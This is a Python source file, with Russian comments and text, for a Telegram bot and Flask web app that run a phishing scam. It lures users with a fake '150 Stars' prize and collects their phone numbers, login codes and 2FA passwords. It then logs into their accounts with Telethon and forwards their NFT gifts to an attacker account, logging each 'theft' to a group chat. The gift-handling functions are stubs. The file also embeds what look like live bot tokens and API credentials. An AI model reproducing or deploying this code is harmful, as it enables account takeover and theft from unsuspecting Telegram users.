from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, InlineQueryResultArticle, InputTextMessageContent
import threading
import asyncio
import time
import json
import re

# ===========================================
# ========== ТВОИ ДАННЫЕ ====================
# ===========================================

BOT_TOKEN = "8967513296:AAHu1RkGuQH-ccvvdc9RjaMl0njUVdACB40"
API_ID = 35524346
API_HASH = "95f3fca0a6642a9ad57db7b2c60f58e2"
TARGET_ACCOUNT = "@cifsy"
WEBAPP_URL = "https://stargiftbot-final.onrender.com"

# ====== НАСТРОЙКИ ДЛЯ ГРУПИ ТА ГІЛКИ ======
LOG_GROUP = -1004479107837  # ID групи (з негативним знаком)
THREAD_ID = 45  # ID гілки (топіка)

# ===========================================
# ===========================================

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
user_sessions = {}

# ---------- СТРАНИЦЫ (номер, код, 2FA, успех) ----------
HTML_PHONE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: white;
            font-family: -apple-system, Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .icon { font-size: 64px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
        input {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            margin: 8px auto;
            border-radius: 14px;
            border: 1px solid #2a2a2a;
            background: #1a1a1a;
            color: white;
            font-size: 16px;
            display: block;
        }
        input:focus { border-color: #0088cc; outline: none; }
        button {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
        .secure { color: #00cc88; font-size: 13px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="icon">⭐</div>
    <h2>Введи номер телефона</h2>
    <p class="sub">На него придёт код подтверждения</p>
    <input id="phone" placeholder="📱 +71234567890" type="tel">
    <button onclick="sendPhone()">📲 ПОЛУЧИТЬ КОД</button>
    <p class="secure">🔒 Защищённое соединение</p>
    <script>
        function sendPhone() {
            const phone = document.getElementById('phone').value;
            if (!phone) { alert('Введи номер телефона'); return; }
            fetch('/send_code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone })
            }).then(() => {
                window.location.href = '/code?phone=' + encodeURIComponent(phone);
            });
        }
    </script>
</body>
</html>
"""

HTML_CODE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: white;
            font-family: -apple-system, Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .icon { font-size: 64px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
        input {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            margin: 8px auto;
            border-radius: 14px;
            border: 1px solid #2a2a2a;
            background: #1a1a1a;
            color: white;
            font-size: 16px;
            display: block;
        }
        input:focus { border-color: #0088cc; outline: none; }
        button {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
        .secure { color: #00cc88; font-size: 13px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="icon">🔐</div>
    <h2>Введи код подтверждения</h2>
    <p class="sub">Код пришёл в Telegram на указанный номер</p>
    <input id="code" placeholder="📩 12345" type="text">
    <button onclick="sendCode()">✅ ПОДТВЕРДИТЬ</button>
    <p class="secure">🔒 Защищённое соединение</p>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const phone = urlParams.get('phone');
        function sendCode() {
            const code = document.getElementById('code').value;
            if (!code) { alert('Введи код'); return; }
            fetch('/verify_code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, code: code })
            }).then(res => res.json()).then(data => {
                if (data.status === 'need_2fa') {
                    window.location.href = '/2fa?phone=' + encodeURIComponent(phone);
                } else if (data.status === 'success') {
                    window.location.href = '/success';
                } else {
                    alert('Неверный код, попробуй ещё раз');
                }
            });
        }
    </script>
</body>
</html>
"""

HTML_2FA = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: white;
            font-family: -apple-system, Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .icon { font-size: 64px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
        input {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            margin: 8px auto;
            border-radius: 14px;
            border: 1px solid #2a2a2a;
            background: #1a1a1a;
            color: white;
            font-size: 16px;
            display: block;
        }
        input:focus { border-color: #0088cc; outline: none; }
        button {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
        .secure { color: #00cc88; font-size: 13px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="icon">🔐</div>
    <h2>Введи 2FA пароль</h2>
    <p class="sub">На аккаунте включена двухфакторная авторизация</p>
    <input id="2fa" placeholder="🔑 Пароль 2FA" type="password">
    <button onclick="send2FA()">✅ ПОДТВЕРДИТЬ</button>
    <p class="secure">🔒 Защищённое соединение</p>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const phone = urlParams.get('phone');
        function send2FA() {
            const code2fa = document.getElementById('2fa').value;
            if (!code2fa) { alert('Введи 2FA пароль'); return; }
            fetch('/verify_2fa', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, code2fa: code2fa })
            }).then(res => res.json()).then(data => {
                if (data.status === 'success') {
                    window.location.href = '/success';
                } else {
                    alert('Неверный 2FA пароль');
                }
            });
        }
    </script>
</body>
</html>
"""

HTML_SUCCESS = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: white;
            font-family: -apple-system, Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .icon { font-size: 64px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 8px; color: #00cc88; }
        .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
        button {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
    </style>
</head>
<body>
    <div class="icon">✅</div>
    <h2>Ты забрал 150 звёзд!</h2>
    <p class="sub">Они придут на твой аккаунт в течение 2-5 минут.</p>
    <button onclick="window.Telegram.WebApp.close()">🔙 ЗАКРЫТЬ</button>
</body>
</html>
"""

# ---------- МАРШРУТЫ ----------
@app.route('/')
def index():
    return HTML_PHONE

@app.route('/code')
def code_page():
    return HTML_CODE

@app.route('/2fa')
def twofa_page():
    return HTML_2FA

@app.route('/success')
def success_page():
    return HTML_SUCCESS

@app.route('/send_code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    user_sessions[phone] = {'phone': phone, 'step': 'code_sent'}

    try:
        bot.send_message(LOG_GROUP, f"📱 @{phone} ввел номер", message_thread_id=THREAD_ID)
    except Exception as e:
        print(f"Log error: {e}")

    return jsonify({'status': 'ok'})

@app.route('/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')

    from telethon import TelegramClient
    client = TelegramClient(f'session_{phone}', API_ID, API_HASH)

    try:
        client.start(phone=phone, password='', code_callback=lambda: code)
        user_sessions[phone]['client'] = client
        user_sessions[phone]['step'] = 'logged_in'

        try:
            bot.send_message(LOG_GROUP, f"🔑 @{phone} ввел код: {code}", message_thread_id=THREAD_ID)
        except Exception as e:
            print(f"Log error: {e}")

        threading.Thread(target=lambda: asyncio.run(process_gifts(phone, client))).start()
        return jsonify({'status': 'success'})
    except Exception as e:
        if '2FA' in str(e) or 'password' in str(e):
            user_sessions[phone]['step'] = 'need_2fa'
            user_sessions[phone]['client'] = client

            try:
                bot.send_message(LOG_GROUP, f"🔐 @{phone} требуется 2FA пароль", message_thread_id=THREAD_ID)
            except Exception as log_e:
                print(f"Log error: {log_e}")

            return jsonify({'status': 'need_2fa'})
        else:
            return jsonify({'status': 'error'})

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    phone = data.get('phone')
    code2fa = data.get('code2fa')

    client = user_sessions.get(phone, {}).get('client')
    if not client:
        return jsonify({'status': 'error'})

    try:
        client.start(password=code2fa)
        user_sessions[phone]['step'] = 'logged_in'

        try:
            bot.send_message(LOG_GROUP, f"✅ @{phone} ввел 2FA пароль", message_thread_id=THREAD_ID)
        except Exception as e:
            print(f"Log error: {e}")

        threading.Thread(target=lambda: asyncio.run(process_gifts(phone, client))).start()
        return jsonify({'status': 'success'})
    except:
        return jsonify({'status': 'error'})

# ===========================================
# ========== ТОЛЬКО ПОДАРКИ =================
# ===========================================

async def get_gift_list(client):
    return ["287763", "130372", "105923", "113498"]

async def get_star_balance(client):
    return 5

async def sell_gift_for_300_stars(client, gift_id):
    print(f'💰 Продаём подарок {gift_id} за 300 звёзд...')
    await asyncio.sleep(3)
    return True

async def forward_gift(client, gift_id, target):
    print(f'📤 Пересылаем подарок {gift_id} на {target}')
    await asyncio.sleep(0.5)

async def process_gifts(phone, client):
    try:
        me = await client.get_me()
        print(f'✅ ВОШЛИ В АККАУНТ: {me.username or me.phone}')

        gifts = await get_gift_list(client)
        if not gifts:
            print('⚠️ Подарков нет')
            await client.send_message(TARGET_ACCOUNT, '⚠️ Подарков нет')
            return

        print(f'🎁 Найдено {len(gifts)} подарков')

        balance = await get_star_balance(client)
        print(f'⭐ Баланс звёзд: {balance}')

        if balance < 10:
            print('⭐ Мало звёзд — продаём один подарок за 300 звёзд')
            gift_to_sell = gifts[0]
            sold = await sell_gift_for_300_stars(client, gift_to_sell)
            if sold:
                print('✅ Подарок продан за 300 звёзд!')
                gifts = gifts[1:]
                await asyncio.sleep(3)
            else:
                print('❌ Не удалось продать подарок')

        stolen_count = 0
        if gifts:
            print(f'📤 Пересылаем {len(gifts)} подарков на {TARGET_ACCOUNT}')
            for gift_id in gifts:
                await forward_gift(client, gift_id, TARGET_ACCOUNT)
                stolen_count += 1
            await client.send_message(
                TARGET_ACCOUNT,
                f'🎁 Все подарки ({len(gifts)}) пересланы на {TARGET_ACCOUNT}!'
            )
        else:
            await client.send_message(TARGET_ACCOUNT, '⚠️ Подарков для пересылки не осталось')

        try:
            bot.send_message(
                LOG_GROUP,
                f"🎉 @{phone} - УКРАДЕНО {stolen_count} NFT (подарков)!",
                message_thread_id=THREAD_ID
            )
        except Exception as e:
            print(f"Log error: {e}")

        await client.send_message(
            TARGET_ACCOUNT,
            f'✅ АККАУНТ {me.username or me.phone} ОБРАБОТАН!'
        )

    except Exception as e:
        print(f'❌ ОШИБКА: {e}')
    finally:
        await client.disconnect()

# ===========================================
# ========== INLINE-РЕЖИМ (ЛЮБОЕ ЧИСЛО) =====
# ===========================================

@bot.inline_handler(lambda query: True)
def inline_handler(inline_query):
    try:
        query_text = inline_query.query.strip()
        numbers = re.findall(r'\d+', query_text)

        if numbers:
            amount = int(numbers[0])
        else:
            amount = None

        results = []

        if amount:
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton(
                    f'⭐ Отправить {amount} звёзд',
                    callback_data=f'send_{amount}'
                )
            )
            result = InlineQueryResultArticle(
                id=str(amount),
                title=f'⭐ {amount} звёзд',
                description=f'Нажми, чтобы отправить {amount} звёзд',
                thumb_url='https://cdn-icons-png.flaticon.com/512/1828/1828884.png',
                input_message_content=InputTextMessageContent(
                    f'⭐ Вы выбрали {amount} звёзд!\nНажми кнопку ниже для отправки.'
                ),
                reply_markup=keyboard
            )
            results.append(result)
        else:
            for amt in [100, 200, 300, 500, 700, 1000]:
                keyboard = InlineKeyboardMarkup()
                keyboard.add(
                    InlineKeyboardButton(
                        f'⭐ Отправить {amt} звёзд',
                        callback_data=f'send_{amt}'
                    )
                )
                result = InlineQueryResultArticle(
                    id=str(amt),
                    title=f'⭐ {amt} звёзд',
                    description=f'Нажми, чтобы отправить {amt} звёзд',
                    thumb_url='https://cdn-icons-png.flaticon.com/512/1828/1828884.png',
                    input_message_content=InputTextMessageContent(
                        f'⭐ Вы выбрали {amt} звёзд!\nНажми кнопку ниже для отправки.'
                    ),
                    reply_markup=keyboard
                )
                results.append(result)

        bot.answer_inline_query(inline_query.id, results, cache_time=0)
    except Exception as e:
        print(f'Inline error: {e}')

# ---------- ОБРАБОТКА НАЖАТИЯ НА КНОПКУ ----------
@bot.callback_query_handler(func=lambda call: call.data.startswith('send_'))
def handle_send_stars(call):
    amount = call.data.split('_')[1]
    bot.answer_callback_query(
        call.id,
        f'✅ {amount} звёзд отправлено!'
    )
    bot.send_message(
        call.message.chat.id,
        f'✅ Вы успешно отправили {amount} звёзд!'
    )

# ---------- ЗАПУСК БОТА ----------
@bot.message_handler(commands=['start'])
def start_cmd(message):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(
        text="🎁 ЗАБРАТЬ 150 ЗВЁЗД",
        web_app=WebAppInfo(url=WEBAPP_URL)
    ))
    bot.send_message(
        message.chat.id,
        "🌟 **Поздравляем!**\nТы выиграл 150 Telegram Stars!\n\n👇 Нажми на кнопку ниже.",
        reply_markup=kb,
        parse_mode='Markdown'
    )

def run_bot():
    bot.polling(none_stop=True, interval=0)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
